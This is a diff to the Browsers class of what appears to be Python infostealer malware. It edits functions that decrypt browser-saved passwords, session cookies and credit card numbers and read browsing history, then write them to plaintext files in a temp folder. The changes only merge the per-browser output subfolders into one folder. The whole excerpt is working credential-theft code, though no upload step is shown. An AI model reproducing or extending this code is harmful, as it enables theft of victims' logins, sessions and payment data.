@@ -566,9 +566,7 @@ class Browsers:
                 url = results[0]
                 login = results[1]
                 password = self.decrypt_password(results[2], self.masterkey)
-                subfolder = os.path.join(tempfolder, "Browser", name)
-                os.makedirs(subfolder, exist_ok=True)
-                with open(os.path.join(subfolder, "passwords.txt"), "a", encoding="utf-8") as f:
+                with open(os.path.join(tempfolder, "Browser", "passwords.txt"), "a", encoding="utf-8") as f:
                     f.write(f"{url}:{login}:{password}\n")
 
     def cookies(self, name: str, path: str, profile: str):
@@ -582,9 +580,7 @@ class Browsers:
         copy2(path, cookievault)
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
-        subfolder = os.path.join(tempfolder, "Browser", name)
-        os.makedirs(subfolder, exist_ok=True)
-        with open(os.path.join(subfolder, "cookies.txt"), 'a', encoding="utf-8") as f:
+        with open(os.path.join(tempfolder, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
@@ -603,9 +599,7 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        subfolder = os.path.join(tempfolder, "Browser", name)
-        os.makedirs(subfolder, exist_ok=True)
-        with open(os.path.join(subfolder, "history.txt"), 'a', encoding="utf-8") as f:
+        with open(os.path.join(tempfolder, "Browser", "history.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                 url, title, visit_count, last_visit_time = res
                 f.write(f"{url}\t{title}\t{visit_count}\t{last_visit_time}\n")
@@ -621,9 +615,7 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        subfolder = os.path.join(tempfolder, "Browser", name)
-        os.makedirs(subfolder, exist_ok=True)
-        with open(os.path.join(subfolder, "cc.txt"), 'a', encoding="utf-8") as f:
+        with open(os.path.join(tempfolder, "Browser", "cc's.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards").fetchall():
                 name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified = res
                 card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
